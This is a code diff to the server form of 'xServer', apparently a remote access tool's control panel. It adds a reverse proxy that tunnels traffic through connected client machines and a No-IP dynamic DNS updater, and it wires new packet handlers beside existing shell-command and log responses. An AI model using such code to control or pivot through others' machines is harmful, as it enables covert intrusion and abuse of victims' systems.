@@ -9,6 +9,7 @@ using xServer.Core.Extensions;
 using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Packets;
+using xServer.Core.ReverseProxy;
 using xServer.Settings;
 
 namespace xServer.Forms
@@ -29,10 +30,13 @@ namespace xServer.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
-            XMLSettings.ShowToolTip =
-                bool.Parse(!string.IsNullOrEmpty(XMLSettings.ReadValue("ShowToolTip"))
-                    ? XMLSettings.ReadValue("ShowToolTip")
-                    : "False"); //fallback
+
+            XMLSettings.ShowToolTip = bool.Parse(XMLSettings.ReadValueSafe("ShowToolTip", "False"));
+            XMLSettings.IntegrateNoIP = bool.Parse(XMLSettings.ReadValueSafe("EnableNoIPUpdater", "False"));
+            XMLSettings.NoIPHost = XMLSettings.ReadValueSafe("NoIPHost");
+            XMLSettings.NoIPUsername = XMLSettings.ReadValueSafe("NoIPUsername");
+            XMLSettings.NoIPPassword = XMLSettings.ReadValueSafe("NoIPPassword");
+
             XMLSettings.Password = XMLSettings.ReadValue("Password");
         }
 
@@ -140,7 +144,11 @@ namespace xServer.Forms
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
-                typeof (Core.Packets.ClientPackets.GetLogsResponse)
+                typeof (Core.Packets.ClientPackets.GetLogsResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
             });
 
             ListenServer.ServerState += ServerState;
@@ -157,6 +165,11 @@ namespace xServer.Forms
                 if (XMLSettings.UseUPnP)
                     UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                 ListenServer.Listen(XMLSettings.ListenPort);
+            }
+
+            if (XMLSettings.IntegrateNoIP)
+            {
+                NoIpUpdater.Start();
             }
         }
 
@@ -280,6 +293,12 @@ namespace xServer.Forms
             else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
             {
                 CommandHandler.HandleGetLogsResponse(client, (Core.Packets.ClientPackets.GetLogsResponse) packet);
+            }
+            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
+                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
+                    type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
+            {
+                ReverseProxyCommandHandler.HandleCommand(client, packet);
             }
         }
 
@@ -697,5 +716,33 @@ namespace xServer.Forms
         }
 
         #endregion
+
+        private void ctxtReverseProxy_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.FrmProxy != null)
+                {
+                    c.Value.FrmProxy.Focus();
+                    return;
+                }
+
+                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
+                frmRS.Show();
+            }
+        }
+
+        private Client[] GetSelectedClients()
+        {
+            List<Client> clients = new List<Client>();
+
+            for (int i = 0; i < lstClients.SelectedItems.Count; i++)
+            {
+                if (lstClients.SelectedItems[i].Tag as Client != null)
+                    clients.Add(lstClients.SelectedItems[i].Tag as Client);
+            }
+            return clients.ToArray();
+        }
     }
 }
